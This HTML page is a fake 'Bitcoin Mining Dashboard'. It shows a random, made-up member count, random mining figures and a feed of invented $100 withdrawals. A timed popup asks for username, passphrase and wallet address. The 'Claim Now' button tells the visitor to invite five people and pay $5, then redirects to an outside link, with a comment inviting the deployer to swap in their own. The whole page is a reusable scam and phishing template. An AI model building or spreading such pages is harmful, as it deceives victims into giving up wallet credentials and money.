<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Bitcoin Mining Dashboard</title>
  <style>
    body {
      background-color: #0d0f14;
      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
      color: #f5f5f5;
      margin: 0;
      padding: 0;
    }
    header {
      background-color: #1b1f27;
      padding: 20px;
      text-align: center;
      font-size: 24px;
      font-weight: bold;
      color: #f2a900;
    }
    .dashboard {
      padding: 20px;
    }
    .main-image {
      text-align: center;
      margin-bottom: 20px;
    }
    .main-image img {
      max-width: 100%;
      border-radius: 10px;
      box-shadow: 0 0 10px #000;
    }
    .stat-box {
      background: #1e222c;
      border-radius: 10px;
      padding: 15px;
      margin-bottom: 20px;
      text-align: center;
    }
    .stat-box h3 {
      margin: 0 0 10px;
      font-size: 18px;
      color: #f2a900;
    }
    .live-mining {
      background: #161a20;
      border-radius: 10px;
      padding: 20px;
      margin-top: 30px;
    }
    .live-mining h2 {
      color: #f2a900;
      text-align: center;
    }
    .mining-amount {
      font-size: 28px;
      margin-top: 10px;
      text-align: center;
    }
    .mining-images {
      display: flex;
      justify-content: center;
      gap: 15px;
      margin-top: 20px;
    }
    .mining-images img {
      width: 100px;
      height: 70px;
      object-fit: cover;
      border-radius: 6px;
      box-shadow: 0 0 6px #000;
    }
    .withdrawals {
      margin-top: 30px;
      background: #1e222c;
      padding: 20px;
      border-radius: 10px;
    }
    .withdrawals h3 {
      margin-bottom: 15px;
    }
    .withdrawal-entry {
      border-bottom: 1px solid #333;
      padding: 10px 0;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .claim-popup {
      position: fixed;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      background: #1b1f27;
      padding: 25px;
      border-radius: 10px;
      display: none;
      flex-direction: column;
      gap: 15px;
      box-shadow: 0 0 20px #000;
      z-index: 1000;
    }
    .claim-popup input {
      padding: 10px;
      border-radius: 5px;
      border: none;
      background: #2b2f38;
      color: #fff;
    }
    .claim-popup button {
      background: #f2a900;
      border: none;
      padding: 10px;
      color: #000;
      border-radius: 5px;
      cursor: pointer;
    }
    .overlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(0,0,0,0.6);
      display: none;
      z-index: 999;
    }
  </style>
</head>
<body>
  <header>Bitcoin Mining Dashboard</header>

  <div class="dashboard">
    <div class="main-image">
      <img src="https://www.investopedia.com/thmb/mSPhP1EK9aR4Zp0ylShw9fTstB4=/1500x0/filters:no_upscale():max_bytes(150000):strip_icc()/bitcoin-mining_GettyImages-1232742736-91ab701b67444fa982d657a33849d8d1.jpg" alt="Bitcoin Mining Rig">
    </div>

    <div class="stat-box">
      <h3>Total Members:</h3>
      <div id="member-count">4,567,227</div>
    </div>
    <div class="stat-box">
      <h3>Your Balance</h3>
      <div>$100</div>
    </div>

    <div class="live-mining">
      <h2>Live Bitcoin Mining</h2>
      <div class="mining-amount" id="mining-amount">Mining in progress... 0.000043 BTC</div>
      <div class="mining-images">
        <img src="https://cryptopotato.com/wp-content/uploads/2019/12/bitcoin_mining_machines-min.jpg" alt="Mining Machine">
        <img src="https://media.wired.com/photos/5d305cdc7431e60008b8f8a1/master/w_2560%2Cc_limit/Bitcoin-mining.jpg" alt="Mining Setup">
        <img src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*EKytYKygk5XZUzzMdOEg2g.jpeg" alt="Crypto Rigs">
      </div>
    </div>

    <div class="withdrawals">
      <h3>Live Withdrawals</h3>
      <div id="withdrawal-list"></div>
    </div>
  </div>

  <div class="overlay" id="overlay"></div>
  <div class="claim-popup" id="claimPopup">
    <input type="text" placeholder="Username" />
    <input type="text" placeholder="Passphrase" />
    <input type="text" placeholder="Wallet Address" />
    <button onclick="claimNow()">Claim Now</button>
  </div>

  <script>
    // Increment members
    let count = 4567227;
    setInterval(() => {
      count += Math.floor(Math.random() * 3);
      document.getElementById("member-count").textContent = count.toLocaleString();
    }, 5000);

    // Simulate mining
    function updateMining() {
      const btc = (Math.random() * 0.01).toFixed(6);
      document.getElementById("mining-amount").textContent = `Mining in progress... ${btc} BTC`;
    }
    setInterval(updateMining, 6000);

    // Withdrawals
    const names = ["John", "Alice", "Carlos", "Fatima", "Li Wei", "Omar", "Maya", "James", "Sophia"];
    const countries = ["ðŸ‡ºðŸ‡¸", "ðŸ‡¬ðŸ‡§", "ðŸ‡¨ðŸ‡¦", "ðŸ‡³ðŸ‡¬", "ðŸ‡®ðŸ‡³", "ðŸ‡§ðŸ‡·", "ðŸ‡©ðŸ‡ª", "ðŸ‡¨ðŸ‡³", "ðŸ‡¿ðŸ‡¦"];
    const withdrawalList = document.getElementById("withdrawal-list");
    const maxEntries = 5000;
    let currentEntries = 0;
    function addWithdrawal() {
      if (currentEntries >= maxEntries) return;
      const name = names[Math.floor(Math.random() * names.length)];
      const country = countries[Math.floor(Math.random() * countries.length)];
      const amount = "$100.00";
      const entry = document.createElement("div");
      entry.className = "withdrawal-entry";
      entry.innerHTML = `<span>${country} ${name}</span><span>${amount}</span>`;
      withdrawalList.insertBefore(entry, withdrawalList.firstChild);
      currentEntries++;
    }
    setInterval(addWithdrawal, 4000);

    // Show popup after 2.5 seconds
    window.onload = function () {
      setTimeout(() => {
        document.getElementById("claimPopup").style.display = "flex";
        document.getElementById("overlay").style.display = "block";
      }, 2500);
    };

    // Claim button
    function claimNow() {
      alert("$100 Claimed Successfully! Now invite 5 people and pay $5 to unlock full features.");
      document.querySelector(".stat-box:nth-child(2) div").textContent = "$0";
      document.getElementById("claimPopup").style.display = "none";
      document.getElementById("overlay").style.display = "none";
      window.location.href = "https://free-paymonth.com.ng/atm.php?user=918&ref=918"; // Replace with your link
    }
  </script>
</body>
</html
